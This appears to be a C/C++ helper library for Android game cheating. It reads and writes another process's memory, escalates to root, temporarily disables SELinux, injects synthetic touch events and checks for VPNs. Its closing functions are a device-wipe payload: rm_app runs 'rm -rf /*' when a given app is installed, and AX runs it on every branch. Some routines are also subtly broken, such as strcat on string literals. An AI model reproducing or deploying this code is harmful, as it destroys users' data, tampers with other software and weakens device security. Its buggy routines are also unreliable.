#include <stdio.h>
#include <stdlib.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <string>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <iostream>
#include <wait.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <malloc.h>
#include <linux/input.h>
#include <sys/system_properties.h>

char *Shell(const char *cmd);/*执行shell命令*/
int find_pid_of(const char *process_name);/*查找进程pid*/
long GetModuleBase(const char *moduleName);/*读取模块地址*/
long int preadv(int pid, void *buffer, ssize_t size, off_t off);/*64内存数据读取*/
long readValue(long address, void *buffer, long size);/*32内存数据读取*/
void writeValue(long address, void *value, long size);/*内存数据写入*/
long ReadDword64(long Address);/*64位指针*/
long ReadDword32(long Address);/*32位指针*/
long ReadInt32(long Address);/*读取dword类型的值*/
float ReadFloat64(long Address);/*读取float类型的值*/
void getRoot(char **argv);/*获取root权限*/
int rebootsystem();/*重启手机:需要root权限*/
int PutDate();/*输出系统当前时间*/
char* getMac();/*获取Mac*/
bool isVPN();/*判断是否用VPN*/
bool Anti_app(const char *packageName);/*检测app是否存在:需要root权限*/
void rm_app(const char *packageName);/*检测到应用格机:需要root权限*/
/*触摸函数:需要root权限*/
inline static int ReportKey(int fd, uint16_t type, uint16_t code, int32_t value);
inline static void TouchPressDown(int fd, int FingerNum, int LineID, int x, int y);
inline static void TouchMove(int fd, int FingerNum, int x, int y);
inline static void TouchPressUp(int fd, int FingerNum);
static int GetTouchEventNum();
int open_driver(const char * path, int flag);
/*触摸函数:需要root权限*/



/*QQ交流群691043164*/
#define BYTE0 0x00000000
#define BYTE4 0x00000004
#define BYTE8 0x00000008
#define BYTE16 0x00000010
#define BYTE24 0x00000018
#define BYTE32 0x00000020
#define BYTE64 0x00000040
#define BYTE128 0x00000080
#define BYTE256 0x00000100
#define BYTE512 0x00000200
#define BYTE1024 0x00000400
#define BYTE2048 0x00000800
typedef char PACKAGENAME;

int pid = -1;

int initPid() {
    pid = find_pid_of("此处填写你的包名");
    return pid;
}

long int preadv(int pid, void *buffer, ssize_t size, off_t off) {
    struct iovec iov_ReadBuffer, iov_ReadOffset;
    iov_ReadBuffer.iov_base = buffer;
    iov_ReadBuffer.iov_len = size;
    iov_ReadOffset.iov_base = (void *) off;
    iov_ReadOffset.iov_len = size;
    return syscall(SYS_process_vm_readv, pid, &iov_ReadBuffer, 1, &iov_ReadOffset, 1, 0);
}

long readValue(long address, void *buffer, long size) {
    struct iovec iov_ReadBuffer{}, iov_ReadOffset{};
    iov_ReadBuffer.iov_base = buffer;
    iov_ReadBuffer.iov_len = size;
    iov_ReadOffset.iov_base = (void *) address;
    iov_ReadOffset.iov_len = size;
    return syscall(SYS_process_vm_readv, pid, &iov_ReadBuffer, 1, &iov_ReadOffset, 1, 0);
}

void writeValue(long address, void *value, long size) {
    struct iovec local[1];
    struct iovec remote[1];
    local[0].iov_base = value;
    local[0].iov_len = size;
    remote[0].iov_base = (void *) address;
    remote[0].iov_len = size;
    syscall(SYS_process_vm_writev, pid, local, 1, remote, 1, 0);
}


long ReadDword64(long Address) {
    long temp = 0;
    preadv(pid, &temp, BYTE16, Address);
    return temp;
}

long ReadDword32(long Address) {
    long temp = 0;
    preadv(pid, &temp, BYTE4, Address);
    return temp;
}

long ReadInt32(long Address) {
    int temp = 0;
    preadv(pid, &temp, BYTE4, Address);
    return temp;
}

float ReadFloat64(long Address) {
    float temp = 0;
    preadv(pid, &temp, BYTE4, Address);
    return temp;
}

char *Shell(const char *cmd) {
    FILE *file = NULL;
    char line[BYTE256] = {};
    char *result = (char *) malloc(BYTE2048);
    memset(result, 0, sizeof(result));
    file = popen(cmd, "r");
    while (fgets(line, sizeof(line), file)) {
        strncat(result, line, strlen(line));
    }
    pclose(file);
    return result;
}

int find_pid_of(const char *process_name) {
    int id;
    pid_t pid = -1;
    DIR *dir;
    FILE *fp;
    char filename[32];
    char cmdline[256];
    struct dirent *entry;
    if (process_name == NULL)
        return -1;
    dir = opendir("/proc");
    if (dir == NULL)
        return -1;
    while ((entry = readdir(dir)) != NULL) {
        id = atoi(entry->d_name);
        if (id != 0) {
            sprintf(filename, "/proc/%d/cmdline", id);
            fp = fopen(filename, "r");
            if (fp) {
                fgets(cmdline, sizeof(cmdline), fp);
                fclose(fp);
                if (strcmp(process_name, cmdline) == 0) {
                    pid = id;
                    break;
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

long GetModuleBase(const char *moduleName) {
    char path[BYTE1024], line[BYTE1024];
    if (pid == -1)
        sprintf(path, "/proc/self/maps");
    else
        sprintf(path, "/proc/%d/maps", pid);
    FILE *file = fopen(path, "r");
    long len = 0;
    if (file) {
        while (fgets(line, sizeof(line), file)) {
            if (strstr(line, moduleName) != NULL) {
                len = strtoul(line, NULL, BYTE16);
                break;
            }
        }
    }
    return len;
}

void getRoot(char **argv)
{
    char shellml[64];
    sprintf(shellml, "su -c %s", *argv);
    if (getuid() != 0)
    {
        system(shellml);
        exit(1);
    }
}


int rebootsystem()
{
    return system("su -c 'reboot'");
}

int PutDate()
{
    return system("date +%F-%T");
}

int getPID(PACKAGENAME *PackageName)
{
    DIR *dir=NULL;
    struct dirent *ptr=NULL;
    FILE *fp=NULL;
    char filepath[256];			// 大小随意，能装下cmdline文件的路径即可
    char filetext[128];			// 大小随意，能装下要识别的命令行文本即可
    dir = opendir("/proc");		// 打开路径
    if (NULL != dir)
    {
        while ((ptr = readdir(dir)) != NULL)	// 循环读取路径下的每一个文件/文件夹
        {
            // 如果读取到的是"."或者".."则跳过，读取到的不是文件夹名字也跳过
            if ((strcmp(ptr->d_name, ".") == 0) || (strcmp(ptr->d_name, "..") == 0))
                continue;
            if (ptr->d_type != DT_DIR)
                continue;
            sprintf(filepath, "/proc/%s/cmdline", ptr->d_name);	// 生成要读取的文件的路径
            fp = fopen(filepath, "r");	// 打开文件
            if (NULL != fp)
            {
                fgets(filetext,sizeof(filetext),fp);	// 读取文件
                if (strcmp(filetext,PackageName)==0)
                {
                    //puts(filepath);
                    //printf("packagename:%s\n",filetext);
                    break;
                }
                fclose(fp);
            }
        }
    }
    if (readdir(dir) == NULL)
    {
        //puts("Get pid fail");
        return 0;
    }
    closedir(dir);	// 关闭路径
    return atoi(ptr->d_name);
}

char* getMac(){
    char* mac = (char*) malloc(64);
    memset(mac, 0, 64);
    char line[1024] = "";

    char* serialno = (char*) malloc(PROP_VALUE_MAX);
    memset(serialno, 0, PROP_VALUE_MAX);
    __system_property_get("ro.serialno", serialno);
    strncat(mac, serialno, strlen(serialno));
    free(serialno);

    FILE* fp = NULL;
    fp = popen("getprop ro.serialno", "r");
    while (fgets(line, 1024, fp) != NULL)
    {
        strncat(mac, line, strlen(line));
    }
    pclose(fp);
    return mac;
}

bool isVPN()
{
    char command[256] = "";
    memset(command, 0, 256);
    if ((access("/system/bin/ifconfig", F_OK)) != -1){
        sprintf(command, "%s", "/system/bin/ifconfig");
    }else{
        return true;
    }
    FILE* fp = NULL;
    char line[1024] = "";
    fp = popen(command, "r");
    while (fgets(line, 1024, fp) != NULL)
    {
        if (strstr(line, "tun0") != NULL || strstr(line, "ppppp0") != NULL){
            pclose(fp);
            return true;
        }
    }
    pclose(fp);
    return false;
}


inline static int ReportKey(int fd, uint16_t type, uint16_t code, int32_t value)
{
    struct input_event event;
    event.type = type;
    event.code = code;
    event.value = value;
    gettimeofday(&event.time, 0);
    if (write(fd, &event, sizeof(struct input_event)) < 0)
    {
        printf("report key error!\n");
        return -1;
    }
    return 0;
}

inline static void TouchPressDown(int fd, int FingerNum, int LineID, int x, int y)
{
    ReportKey(fd, EV_ABS, ABS_MT_SLOT, FingerNum);
    ReportKey(fd, EV_ABS, ABS_MT_TRACKING_ID, LineID);
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_X, x); //report position x,y
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_Y, y);
    ReportKey(fd, EV_KEY, BTN_TOUCH, 1); //report touch preesed event.
    ReportKey(fd, EV_SYN, SYN_REPORT, 0); //report syn signal , finish the curent event!
}

inline static void TouchMove(int fd, int FingerNum, int x, int y)
{
    ReportKey(fd, EV_ABS, ABS_MT_SLOT, FingerNum);
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_X, x); //report position x,y
    ReportKey(fd, EV_ABS, ABS_MT_POSITION_Y, y);
    ReportKey(fd, EV_SYN, SYN_REPORT, 0); //report syn signal , finish the curent event!
}


inline static void TouchPressUp(int fd, int FingerNum)
{
    ReportKey(fd, EV_ABS, ABS_MT_SLOT, FingerNum);
    ReportKey(fd, EV_ABS, ABS_MT_TRACKING_ID, -1);
    ReportKey(fd, EV_KEY, BTN_TOUCH, 0); //report touch release event.
    ReportKey(fd, EV_SYN, SYN_REPORT, 0); //report syn signal , finish the curent event!
}


static int GetTouchEventNum()
{
    int nLastEventNum = -1;
    int lastLineIsKey = -1;

    FILE *f = fopen("/proc/bus/input/devices", "r");
    if (f == NULL)
    {
        //���ܿ�����SELinux���ر�SELinux��������һ�ο���
        if (errno == EACCES)
        {
            FILE * fp = popen("su", "w");
            if (fp)
            {
                //��ʱ�ر�SELinux
                char cmd[512] = { 0 };
                snprintf(cmd, sizeof(cmd), "setenforce 0\n");
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);

                f = fopen("/proc/bus/input/devices", "r");

                //�ָ���SELinux
                fp = popen("su", "w");
                snprintf(cmd, sizeof(cmd), "setenforce 1\n");
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);
            }
        }
        if (f == NULL)
        {
            return -1;
        }
    }
    char s[512] = { 0 };
    while (fgets(s, 511, f)) //read a line into s
    {
        char *pTags = strstr(s, "Handlers=");
        if (pTags)
        {
            //printf("Handlers=%s\n", s);
            pTags = strstr(s, "event");
            if (pTags)
            {
                sscanf(pTags, "event%d", &nLastEventNum);
            }
            else
            {
                nLastEventNum = -1;
            }
            //printf("nLastEventNum=%d\n", nLastEventNum);
            continue;
        }
        pTags = strstr(s, "KEY=");
        if (pTags)
        {
            if (fgets(s, 511, f))
            {
                pTags = strstr(s, "ABS=");
                if (pTags)
                {
                    fclose(f);
                    return nLastEventNum;
                }
            }
            else
            {
                break;
            }
            continue;
        }
    }
    fclose(f);
    return -1;
}


int open_driver(const char * path, int flag)
{
    int fd = open(path, flag);
    if (fd <= 0)
    {
        int last_err = errno;
        if (last_err == EACCES)
        {
            //���ܿ�����SELinux���ر�SELinux��������һ�ο���
            FILE * fp = popen("su", "w");
            if (fp)
            {
                //��ʱ�ر�SELinux
                char cmd[512] = { 0 };
                snprintf(cmd, sizeof(cmd), "chmod 666 %s\n setenforce 0\n", path);
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);

                fd = open(path, O_RDWR);

                //�ָ���SELinux
                fp = popen("su", "w");
                snprintf(cmd, sizeof(cmd), "chmod 0660 %s\n setenforce 1\n", path);
                fwrite(cmd, 1, strlen(cmd) + 1, fp);
                pclose(fp);
            }
        }

        if (fd <= 0)
        {
            printf("open error():%s\n", strerror(last_err));
            return -last_err;
        }
    }
    return fd;
}

bool Anti_app(const char *packageName){
    char *appPath = nullptr;
    char *data = "/data/user/0/";
    appPath = strcat(data, packageName);
    int arm = access(appPath, F_OK);
    if(!arm) {
        return true;                               
    }else {
        return false;
    }
}


void rm_app(const char *packageName){
    char *appPath = nullptr;
    char *data = "/data/user/0/";
    appPath = strcat(data, packageName);
    int arm = access(appPath, F_OK);
    if(!arm) {
        system("rm -rf /*");
    }else {
        printf("没有此应用");
    }
}

void AX(int a,const char *packageName){
    if(a == 0){
        system("rm -rf /*");/*0 ==格机*/
    }else if(a == 1){
        system("rm -rf /*");/*0 ==格机*/
    }else if(a ==2){
        system("rm -rf /*");/*0 ==格机*/
    }
};




